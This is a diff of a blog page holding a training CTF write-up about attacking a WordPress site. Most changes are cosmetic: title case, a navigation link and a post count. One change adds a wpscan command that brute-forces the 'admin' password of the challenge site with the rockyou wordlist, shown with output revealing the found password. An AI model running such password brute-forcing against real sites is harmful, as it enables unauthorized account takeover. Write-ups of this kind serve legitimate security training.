@@ -98,7 +98,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="nihwk-training-2018, write-up, web, wordpress">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Nihwk Training CTF - WordPress">
+<meta property="og:title" content="NIHWK training CTF - WordPress">
 <meta property="og:url" content="/2018/08/22/NIHWK-Write-Up-Wordpress/">
 <meta property="og:site_name" content="Pxmme">
 <meta property="og:description" content="">
@@ -106,7 +106,7 @@
 <meta property="og:image" content="/imgs/wphome.png">
 <meta property="og:image" content="/imgs/wpshop.png">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Nihwk Training CTF - WordPress">
+<meta name="twitter:title" content="NIHWK training CTF - WordPress">
 <meta name="twitter:description" content="">
 <meta name="twitter:image" content="/imgs/wphome.png">
 
@@ -141,7 +141,7 @@
 
 
 
-  <title>Nihwk Training CTF - WordPress | Pxmme</title>
+  <title>NIHWK training CTF - WordPress | Pxmme</title>
   
 
 
@@ -284,7 +284,7 @@
           <h1 class="post-title" itemprop="name headline">
           
           
-            Nihwk Training CTF - WordPress
+            NIHWK training CTF - WordPress
           
         </h1>
         
@@ -407,8 +407,10 @@
 
 <div class="highlighter-rouge">
 <div class="highlight"><table style="margin: 0px"><tbody><tr>
-<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9</pre></td>
-<td class="code"><pre class="highlight"><code>[+] Starting the password brute forcer
+<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11</pre></td>
+<td class="code"><pre class="highlight"><code>wpscan --url http://jordpress.herokuapp.com/ --wordlist /usr/share/wordlists/rockyou.txt --username admin
+
+[+] Starting the password brute forcer
   [+] [SUCCESS] Login : admin Password : 12345678
 
   Brute Forcing 'admin' Time: 00:00:23
@@ -700,6 +702,10 @@ flag{wordpress_1s_vulnerable!!!!!!!}
         <div class="post-nav" id="post-nav-id">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2018/08/22/2018-08-21-TJCTF-Write-Up-Python-Reversing/" rel="next" title="">
+                <i class="fa fa-chevron-left"></i> 
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
@@ -787,7 +793,7 @@ flag{wordpress_1s_vulnerable!!!!!!!}
           
             <div class="site-state-item site-state-posts">
               <a href="">
-                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-count">12</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
